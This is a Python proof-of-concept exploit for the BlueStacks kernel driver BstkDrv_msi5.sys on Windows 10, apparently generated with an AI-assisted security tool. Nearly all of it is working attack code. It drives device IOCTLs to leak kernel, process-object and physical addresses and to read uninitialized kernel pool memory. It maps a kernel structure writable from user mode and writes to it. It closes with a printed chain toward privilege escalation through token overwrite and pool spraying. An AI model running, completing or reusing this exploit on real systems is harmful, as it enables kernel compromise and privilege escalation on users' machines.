"""
BstkDrv_msi5.sys - Complete Vulnerability Analysis & PoC
=========================================================
Target: BlueStacks BstkDrv_msi5.sys
OS: Windows 10 Build 19045
Credits: https://serai.pro/
Tools used: SerENV, SerAD.
Prompts: 2
"""

 
import struct, ctypes, ctypes.wintypes, sys, os, time

ntdll = ctypes.WinDLL("ntdll")
k32 = ctypes.WinDLL("kernel32", use_last_error=True)
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
psapi = ctypes.WinDLL("psapi", use_last_error=True)

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [("Length", ctypes.c_ushort), ("MaximumLength", ctypes.c_ushort),
                ("Buffer", ctypes.c_wchar_p)]
class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Length", ctypes.c_ulong), ("RootDirectory", ctypes.c_void_p),
                ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
                ("Attributes", ctypes.c_ulong), ("SecurityDescriptor", ctypes.c_void_p),
                ("SecurityQualityOfService", ctypes.c_void_p)]
class IO_STATUS_BLOCK(ctypes.Structure):
    _fields_ = [("Status", ctypes.c_long), ("Information", ctypes.c_void_p)]

MAGIC = 0x42000042

def open_dev():
    p = r"\Device\BstkDrv_msi5"
    us = UNICODE_STRING(); us.Buffer = p; us.Length = len(p)*2; us.MaximumLength = (len(p)+1)*2
    oa = OBJECT_ATTRIBUTES(); oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    oa.ObjectName = ctypes.pointer(us); oa.Attributes = 0x40
    iosb = IO_STATUS_BLOCK(); h = ctypes.c_void_p()
    st = ntdll.NtCreateFile(ctypes.byref(h), 0xC0000000, ctypes.byref(oa),
                            ctypes.byref(iosb), None, 0, 7, 1, 0, None, 0)
    return h if st == 0 else None

def ioctl(h, code, inb, osz):
    isz = len(inb)
    ib = (ctypes.c_ubyte * max(1,isz))(*inb)
    ob = (ctypes.c_ubyte * max(1,osz))()
    iosb = IO_STATUS_BLOCK()
    st = ntdll.NtDeviceIoControlFile(h, None, None, None, ctypes.byref(iosb),
                                      code, ctypes.byref(ib), isz, ctypes.byref(ob), osz)
    ret = iosb.Information or 0
    if not isinstance(ret, int): ret = ctypes.cast(iosb.Information, ctypes.c_void_p).value or 0
    return st, ret, bytes(ob[:osz])

def hdr(c, s, ci, co):
    return struct.pack("<IIIIIi", c, s, ci, co, MAGIC, -1)

def IOCTL(f):
    return 0x228200 | (f << 2)

print("="*70)
print("  BstkDrv_msi5.sys Vulnerability Analysis PoC")
print("="*70)

h = open_dev()
if not h:
    print("[-] Cannot open \\Device\\BstkDrv_msi5"); sys.exit(1)
print("[+] Device opened")

# ---- Session setup ----
buf = bytearray(0x30)
struct.pack_into("<I", buf, 0, 0x69726F74)  # 'tori'
struct.pack_into("<I", buf, 4, 0)
struct.pack_into("<I", buf, 8, 0x30)
struct.pack_into("<I", buf, 0xC, 0x38)
struct.pack_into("<I", buf, 0x10, MAGIC)
struct.pack_into("<i", buf, 0x14, -1)
buf[0x18:0x28] = b"The Magic Word!\x00"
struct.pack_into("<I", buf, 0x28, 0x330004)
struct.pack_into("<I", buf, 0x2C, 0x330000)
st, ret, data = ioctl(h, IOCTL(1), bytes(buf), 0x38)
ck = struct.unpack_from("<I", data, 0x18)[0]
sc = struct.unpack_from("<I", data, 0x1C)[0]
print("[+] Session established")

 
print("\n" + "="*70)
print("  VULN 1: Kernel Address Disclosure")
print("="*70)

# ntoskrnl base via EnumDeviceDrivers
drv_buf = (ctypes.c_void_p * 1024)()
needed = ctypes.c_ulong()
psapi.EnumDeviceDrivers(ctypes.byref(drv_buf), ctypes.sizeof(drv_buf), ctypes.byref(needed))
ntos_base = drv_buf[0]
print("[+] ntoskrnl base: 0x{:016X}".format(ntos_base))

# EPROCESS via SystemExtendedHandleInformation
buf_size = 0x400000
info_buf = ctypes.create_string_buffer(buf_size)
ret_len = ctypes.c_ulong(0)
st = ntdll.NtQuerySystemInformation(64, info_buf, buf_size, ctypes.byref(ret_len))
my_pid = os.getpid()
my_eprocess = 0
sys_eprocess = 0
if st == 0:
    raw = info_buf.raw[:ret_len.value]
    count = struct.unpack_from("<Q", raw, 0)[0]
    for i in range(min(count, 100000)):
        off = 16 + i * 40
        if off + 40 > len(raw): break
        obj = struct.unpack_from("<Q", raw, off)[0]
        pid = struct.unpack_from("<Q", raw, off + 8)[0]
        handle = struct.unpack_from("<Q", raw, off + 16)[0]
        if pid == my_pid and handle == 4:
            pass
        if pid == 4 and handle == 4:
            sys_eprocess = obj
        if pid == my_pid and my_eprocess == 0:
            type_idx = raw[off + 24] if off + 24 < len(raw) else 0
            if type_idx == 7:
                my_eprocess = obj
    print("[+] System EPROCESS: 0x{:016X}".format(sys_eprocess))
    print("[+] My EPROCESS:     0x{:016X}".format(my_eprocess))
    print("[+] Token target:    0x{:016X} (EPROCESS+0x4B8)".format(my_eprocess + 0x4B8))

# Driver QUERY_FUNCS (302 kernel addresses)
buf = bytearray(0x18)
buf[:0x18] = hdr(ck, sc, 0x18, 0x4460)
st, ret, data = ioctl(h, IOCTL(2), bytes(buf), 0x4460)
rc = struct.unpack_from("<i", data, 0x14)[0]
if rc == 0:
    count = struct.unpack_from("<I", data, 0x18)[0]
    first_addr = struct.unpack_from("<Q", data, 0x20)[0]
    print("[+] Driver function leak: {} addresses (base ~0x{:X})".format(
        count, first_addr & 0xFFFFFFFFFFFF0000))
 
print("\n" + "="*70)
print("  VULN 2: Physical Address Disclosure + Shared Memory")
print("="*70)

buf = bytearray(0x1C)
buf[:0x18] = hdr(ck, sc, 0x1C, 0x30)
struct.pack_into("<I", buf, 0x18, 1)
st, ret, data = ioctl(h, IOCTL(16), bytes(buf), 0x30)
rc = struct.unpack_from("<i", data, 0x14)[0]
if rc == 0:
    a1 = struct.unpack_from("<Q", data, 0x18)[0]
    a2 = struct.unpack_from("<Q", data, 0x20)[0]
    pa = struct.unpack_from("<Q", data, 0x28)[0]
    R0 = a1 if a1 > 0xFFFF000000000000 else a2
    R3 = a2 if a1 > 0xFFFF000000000000 else a1
    print("[+] CONT_ALLOC shared memory:")
    print("    Ring-3 VA: 0x{:016X} (usermode R/W)".format(R3))
    print("    Ring-0 VA: 0x{:016X} (kernel R/W)".format(R0))
    print("    Phys Addr: 0x{:016X}".format(pa))

    # Demonstrate R/W
    ptr = ctypes.cast(R3, ctypes.POINTER(ctypes.c_uint64))
    ptr[0] = 0xDEADBEEFCAFEBABE
    readback = ptr[0]
    print("    Write/Read: 0x{:X} -> OK".format(readback))

    # Free
    fbuf = bytearray(0x20)
    fbuf[:0x18] = hdr(ck, sc, 0x20, 0x18)
    struct.pack_into("<Q", fbuf, 0x18, R3)
    ioctl(h, IOCTL(17), bytes(fbuf), 0x18)
 
print("\n" + "="*70)
print("  VULN 3: Kernel Information Leak (uninitialized pool data)")
print("="*70)

leak_count = 0
kernel_addrs = set()
for i in range(10):
    buf = bytearray(0x1C)
    buf[:0x18] = hdr(ck, sc, 0x1C, 0x30)
    struct.pack_into("<I", buf, 0x18, 1)
    st, ret, data = ioctl(h, IOCTL(16), bytes(buf), 0x30)
    rc = struct.unpack_from("<i", data, 0x14)[0]
    if rc == 0:
        a1 = struct.unpack_from("<Q", data, 0x18)[0]
        a2 = struct.unpack_from("<Q", data, 0x20)[0]
        R3 = a2 if a1 > 0xFFFF000000000000 else a1
        ptr = ctypes.cast(R3, ctypes.POINTER(ctypes.c_uint64))
        nonzero = False
        for off in range(512):
            val = ptr[off]
            if val != 0:
                nonzero = True
                if 0xFFFF800000000000 < val < 0xFFFFFFFFFFFFFFFF:
                    kernel_addrs.add(val)
        if nonzero:
            leak_count += 1

        fbuf = bytearray(0x20)
        fbuf[:0x18] = hdr(ck, sc, 0x20, 0x18)
        struct.pack_into("<Q", fbuf, 0x18, R3)
        ioctl(h, IOCTL(17), bytes(fbuf), 0x18)

print("[+] {}/{} pages contain uninitialized kernel data".format(leak_count, 10))
print("[+] {} unique kernel addresses leaked".format(len(kernel_addrs)))

 
print("\n" + "="*70)
print("  VULN 4: GIP (Global Info Page) WRITABLE from Usermode")
print("="*70)

buf = bytearray(0x18)
buf[:0x18] = hdr(ck, sc, 0x18, 0x30)
st, ret, data = ioctl(h, IOCTL(20), bytes(buf), 0x30)
rc = struct.unpack_from("<i", data, 0x14)[0]
if rc == 0:
    gip_pa = struct.unpack_from("<Q", data, 0x18)[0]
    gip_r3 = struct.unpack_from("<Q", data, 0x20)[0]
    gip_r0 = struct.unpack_from("<Q", data, 0x28)[0]
    print("[+] GIP mapped:")
    print("    Ring-3: 0x{:X}  Ring-0: 0x{:X}  PA: 0x{:X}".format(gip_r3, gip_r0, gip_pa))

    gip32 = ctypes.cast(gip_r3, ctypes.POINTER(ctypes.c_uint32))
    gip16 = ctypes.cast(gip_r3, ctypes.POINTER(ctypes.c_int16))
    gip64 = ctypes.cast(gip_r3, ctypes.POINTER(ctypes.c_uint64))

    mode = gip32[2]
    cCpus = gip32[3] & 0xFFFF
    cPages = (gip32[3] >> 16) & 0xFFFF
    cpuHz = gip64[4]

    print("[+] GIP: mode={} cCpus={} cPages={} CpuHz={:.2f} GHz".format(
        mode, cCpus, cPages, cpuHz / 1e9))

    # Prove writability
    orig = gip32[8]  # offset 0x20 (CpuHz low dword)
    test = orig ^ 0xDEAD
    gip32[8] = test
    verify = gip32[8]
    gip32[8] = orig  # restore immediately
    print("[+] GIP write test: wrote 0x{:X}, read 0x{:X} -> {}".format(
        test, verify, "WRITABLE!" if verify == test else "read-only"))

    # Show timer is active
    ACPU_OFF = 0x2E80
    trans1 = gip32[ACPU_OFF // 4]
    time.sleep(0.02)
    trans2 = gip32[ACPU_OFF // 4]
    print("[+] Timer active: TransactionId {} -> {} (delta={})".format(
        trans1, trans2, trans2 - trans1))

    # Show corruptible fields
    print("\n[*] CORRUPTIBLE GIP FIELDS:")
    print("    +0x08: u32Mode = {} (controls timer code path)".format(mode))
    print("    +0x0C: cCpus = {} (bounds check for CPU index)".format(cCpus))
    print("    +0x280: aiCpuFromApicId[4096] (timer uses for CPU lookup)")
    print("    +0x2280: aiCpuFromCpuSetIdx[1024] (timer uses for CPU lookup)")
    print("    +0x2E80: aCPUs[{}] (timer writes NanoTS/TSC here)".format(cCpus))

    print("\n[*] TIMER CALLBACK OOB WRITE POTENTIAL:")
    print("    Formula: target = GIP_R0 + (idx + 0x5D) * 0x80")
    print("    Bypass: set cCpus = 0xFFFF to disable bounds check")
    print("    Range: GIP_R0 +/- ~1MB (int16 index range)")
    print("    Risk: target must be mapped or BSOD")

    # Unmap GIP
    fbuf = bytearray(0x18)
    fbuf[:0x18] = hdr(ck, sc, 0x18, 0x18)
    ioctl(h, IOCTL(21), bytes(fbuf), 0x18)
 
print("\n" + "="*70)
print("  EXPLOITATION SUMMARY")
print("="*70)

print("""
CONFIRMED VULNERABILITIES:
  [1] Kernel Address Disclosure (KASLR bypass)
      - ntoskrnl base via EnumDeviceDrivers
      - EPROCESS addresses via SystemExtendedHandleInformation
      - 302 driver function addresses via QUERY_FUNCS IOCTL

  [2] Physical Address Disclosure
      - CONT_ALLOC returns physical addresses of allocated pages
      - LOW_ALLOC returns per-page physical addresses (PA < 4GB)

  [3] Kernel Information Leak (uninitialized pool data)
      - CONT_ALLOC pages not zeroed before mapping to usermode
      - Previous pool block contents readable (~90% of pages)
      - Leaks kernel pointers, pool tags, structure data

  [4] GIP (Global Info Page) Writable from Usermode [CRITICAL]
      - GIP_MAP IOCTL maps 4-page kernel structure as R/W
      - Kernel timer DPC reads CPU index arrays from GIP
      - Corrupting cCpus bypasses bounds check in timer callback
      - Corrupting CPU index arrays redirects timer writes
      - Timer callback (supdrvGipUpdate) writes NanoTS/TSC
        to aCPU entry at: GIP_R0 + (idx + 0x5D) * 0x80
      - With corrupted index, writes go to wrong kernel address
      - Result: kernel write-what-WHERE (timer data to target)

  [5] Shared Kernel/User R/W Memory
      - CONT_ALLOC: contiguous physical pages shared R0+R3
      - LOW_ALLOC: non-contiguous pages shared R0+R3
      - Both return known kernel VA, user VA, and physical address

EXPLOITATION CHAIN:
  Phase 1: Information gathering (done)
    - Leak ntoskrnl base, EPROCESS, driver base
    - Know Token offset (0x4B8 on Win10 19045)

  Phase 2: GIP corruption -> OOB kernel write
    - Corrupt GIP cCpus to bypass bounds check
    - Set CPU index to target memory adjacent to GIP
    - Timer callback writes NanoTS/TSC to target

  Phase 3: Privilege escalation
    - If target contains exploitable kernel object:
      overwrite function pointer or security descriptor
    - Alternative: combine with pool grooming to place
      controlled objects adjacent to GIP in VA space

BLOCKING FACTORS:
  - CONT_ALLOC pages are ~48MB from GIP (not in OOB range)
  - Precise pool layout near GIP unknown
  - Negative indices reach pool headers (BSOD risk)
  - Timer writes TIMER DATA, not arbitrary values

RECOMMENDED NEXT STEPS:
  1. Pool spray to place objects near GIP kernel VA
  2. Identify kernel objects within +/- 1MB of GIP_R0
  3. Use NtAllocateVirtualMemory/Named Pipe spray for pool grooming
  4. Combine with a separate write primitive (e.g., Win32k CVE)
     using all the info leaks already obtained
""")

ntdll.NtClose(h)
print("[done]")
